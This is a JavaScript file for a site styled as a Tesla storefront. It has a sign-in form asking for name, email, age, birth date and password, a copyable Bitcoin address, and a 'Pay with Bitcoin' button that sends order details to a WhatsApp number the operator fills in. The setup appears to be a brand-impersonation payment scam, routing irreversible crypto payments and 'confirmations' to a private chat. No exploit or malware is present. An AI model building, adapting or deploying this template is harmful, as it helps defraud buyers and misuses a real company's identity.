// ========================
// TESLA WEBSITE - app.js
// ========================

// ===== YOUR WHATSAPP NUMBER =====
const WA_NUM = "2348012345678"; // Replace with your real number

// ===== NAVBAR SCROLL =====
window.addEventListener('scroll', () => {
  document.getElementById('navbar').classList.toggle('scrolled', scrollY > 10);
});

// ===== MOBILE MENU =====
document.getElementById('hamburger').onclick = () => {
  document.getElementById('mobileMenu').classList.add('open');
  document.body.style.overflow = 'hidden';
};

document.getElementById('mobClose').onclick = () => {
  document.getElementById('mobileMenu').classList.remove('open');
  document.body.style.overflow = '';
};

document.querySelectorAll('.mobile-menu a').forEach(a => {
  a.addEventListener('click', () => {
    document.getElementById('mobileMenu').classList.remove('open');
    document.body.style.overflow = '';
  });
});

// ===== SIGN IN MODAL =====
function openSignIn() {
  document.getElementById('signInModal').classList.add('show');
  document.body.style.overflow = 'hidden';
}

function closeSignIn() {
  document.getElementById('signInModal').classList.remove('show');
  document.body.style.overflow = '';
}

document.getElementById('openSignIn').onclick = (e) => {
  e.preventDefault();
  openSignIn();
};

document.getElementById('mobSignIn').onclick = (e) => {
  e.preventDefault();
  document.getElementById('mobileMenu').classList.remove('open');
  document.body.style.overflow = '';
  setTimeout(() => openSignIn(), 350);
};

document.getElementById('signInModal').addEventListener('click', (e) => {
  if (e.target.id === 'signInModal') closeSignIn();
});

// ===== SIGN IN SUBMIT =====
document.getElementById('signSubmit').onclick = () => {
  const name  = document.getElementById('signName').value.trim();
  const email = document.getElementById('signEmail').value.trim();
  const age   = document.getElementById('signAge').value.trim();
  const dob   = document.getElementById('signDob').value.trim();
  const pass  = document.getElementById('signPass').value.trim();

  if (!name || !email || !age || !dob || !pass) {
    showToast('⚠️ Please fill in all fields.');
    return;
  }
  if (parseInt(age) < 16) {
    showToast('⚠️ You must be at least 16 years old.');
    return;
  }
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) {
    showToast('⚠️ Please enter a valid email address.');
    return;
  }
  if (pass.length < 6) {
    showToast('⚠️ Password must be at least 6 characters.');
    return;
  }

  localStorage.setItem('tesla_user', JSON.stringify({ name, email }));

  const first = name.split(' ')[0];
  const btn = document.getElementById('openSignIn');
  btn.textContent = `Hi, ${first} ▾`;
  btn.style.borderColor = '#e31937';
  btn.style.color = '#e31937';

  if (!document.getElementById('orderName').value)
    document.getElementById('orderName').value = name;
  if (!document.getElementById('orderEmail').value)
    document.getElementById('orderEmail').value = email;

  closeSignIn();
  showToast(`🚗 Welcome to Tesla, ${first}!`);
};

// ===== TOAST =====
function showToast(msg) {
  let t = document.getElementById('toast');
  if (!t) {
    t = document.createElement('div');
    t.id = 'toast';
    t.style.cssText = `
      position: fixed;
      bottom: 100px;
      left: 50%;
      transform: translateX(-50%);
      background: #171a20;
      color: white;
      padding: 14px 28px;
      border-radius: 30px;
      font-family: 'Rajdhani', sans-serif;
      font-size: 16px;
      font-weight: 600;
      z-index: 9999;
      box-shadow: 0 8px 30px rgba(0,0,0,0.3);
      transition: opacity 0.4s;
      pointer-events: none;
      white-space: nowrap;
    `;
    document.body.appendChild(t);
  }
  t.textContent = msg;
  t.style.opacity = '1';
  clearTimeout(t._t);
  t._t = setTimeout(() => t.style.opacity = '0', 3500);
}

// ===== COPY BTC ADDRESS =====
// Works on both file:// and https:// 
function copyBTC() {
  const addr = document.getElementById('btcAddress').textContent.trim();
  const btn = document.querySelector('.copy-btn');

  // Method 1 — Modern Clipboard API
  if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(addr).then(() => {
      showCopied(btn);
    }).catch(() => {
      fallbackCopy(addr, btn);
    });
  } else {
    // Method 2 — Fallback (works on file://)
    fallbackCopy(addr, btn);
  }
}

function fallbackCopy(text, btn) {
  const el = document.createElement('textarea');
  el.value = text;
  el.setAttribute('readonly', '');
  el.style.cssText = `
    position: absolute;
    left: -9999px;
    top: -9999px;
    opacity: 0;
  `;
  document.body.appendChild(el);
  el.focus();
  el.select();
  el.setSelectionRange(0, 99999); // for mobile
  try {
    const success = document.execCommand('copy');
    if (success) {
      showCopied(btn);
    } else {
      showManual(text);
    }
  } catch (err) {
    showManual(text);
  }
  document.body.removeChild(el);
}

function showCopied(btn) {
  btn.textContent = '✓ Copied!';
  btn.style.background = '#4caf50';
  btn.style.transform = 'scale(1.08)';
  showToast('₿ Bitcoin address copied to clipboard!');
  setTimeout(() => {
    btn.textContent = 'Copy';
    btn.style.background = '';
    btn.style.transform = '';
  }, 2500);
}

function showManual(text) {
  // If all else fails show address in a prompt so user can manually copy
  window.prompt('Copy this Bitcoin address manually (Ctrl+C):', text);
}

// ===== LIVE BTC PRICE =====
async function fetchBTC() {
  try {
    const r = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
    const d = await r.json();
    document.getElementById('btcPrice').textContent =
      `₿ 1 BTC = $${d.bitcoin.usd.toLocaleString()} USD · Live`;
  } catch {
    document.getElementById('btcPrice').textContent =
      '₿ Bitcoin — Secure & Borderless Payments';
  }
}

fetchBTC();
setInterval(fetchBTC, 60000);

// ===== PAY BUTTON → WHATSAPP =====
document.getElementById('payBtn').onclick = () => {
  const name  = document.getElementById('orderName').value.trim();
  const email = document.getElementById('orderEmail').value.trim();
  const phone = document.getElementById('orderPhone').value.trim();
  const model = document.getElementById('modelSelect').value;

  if (!name || !email) {
    showToast('⚠️ Please enter your name and email.');
    return;
  }

  const msg = encodeURIComponent(
    `🚗 *New Tesla Order!*\n\n` +
    `*Name:* ${name}\n` +
    `*Email:* ${email}\n` +
    `*Phone:* ${phone || 'Not provided'}\n` +
    `*Model:* ${model}\n` +
    `*Payment:* Bitcoin ₿\n\n` +
    `I have initiated my Bitcoin payment. Please confirm my reservation. Thank you!`
  );

  document.getElementById('waLink').href = `https://wa.me/${WA_NUM}?text=${msg}`;
  document.getElementById('payMsg').textContent =
    `Thank you ${name}! Your ${model} reservation is being processed. Tap below to confirm on WhatsApp.`;

  document.getElementById('payModal').classList.add('show');
  document.body.style.overflow = 'hidden';
};

function closePayModal() {
  document.getElementById('payModal').classList.remove('show');
  document.body.style.overflow = '';
}

document.getElementById('payModal').addEventListener('click', (e) => {
  if (e.target.id === 'payModal') closePayModal();
});

// Update pay button price when model changes
document.getElementById('modelSelect').addEventListener('change', function () {
  const p = this.value.match(/\$[\d,]+/);
  if (p) document.getElementById('payBtn').textContent = `₿ Pay ${p[0]} with Bitcoin`;
});

// ===== STAT COUNTERS =====
const counters = [
  { id: 'c1', target: 5000000, format: 'M' },
  { id: 'c2', target: 45000,   format: 'K' },
  { id: 'c3', target: 50,      format: ''  },
  { id: 'c4', target: 10,      format: 'B' },
];

const statsObs = new IntersectionObserver(entries => {
  entries.forEach(e => {
    if (e.isIntersecting) {
      counters.forEach(c => {
        let cur = 0;
        const steps = 60;
        const inc = c.target / steps;
        const el = document.getElementById(c.id);
        const timer = setInterval(() => {
          cur += inc;
          if (cur >= c.target) { cur = c.target; clearInterval(timer); }
          if (c.format === 'M') el.textContent = (cur / 1000000).toFixed(1) + 'M';
          else if (c.format === 'K') el.textContent = (cur / 1000).toFixed(0) + 'K';
          else if (c.format === 'B') el.textContent = Math.floor(cur) + 'B';
          else el.textContent = Math.floor(cur);
        }, 2000 / steps);
      });
      statsObs.disconnect();
    }
  });
}, { threshold: 0.3 });

statsObs.observe(document.querySelector('.stats-section'));

// ===== SMOOTH SCROLL =====
document.querySelectorAll('a[href^="#"]').forEach(a => {
  a.addEventListener('click', function (e) {
    const t = document.querySelector(this.getAttribute('href'));
    if (t) { e.preventDefault(); t.scrollIntoView({ behavior: 'smooth' }); }
  });
});

// ===== RESTORE SESSION =====
window.addEventListener('load', () => {
  const u = localStorage.getItem('tesla_user');
  if (u) {
    const { name, email } = JSON.parse(u);
    const first = name.split(' ')[0];
    const btn = document.getElementById('openSignIn');
    btn.textContent = `Hi, ${first} ▾`;
    btn.style.borderColor = '#e31937';
    btn.style.color = '#e31937';
    const on = document.getElementById('orderName');
    const oe = document.getElementById('orderEmail');
    if (on && !on.value) on.value = name;
    if (oe && !oe.value) oe.value = email;
  }
});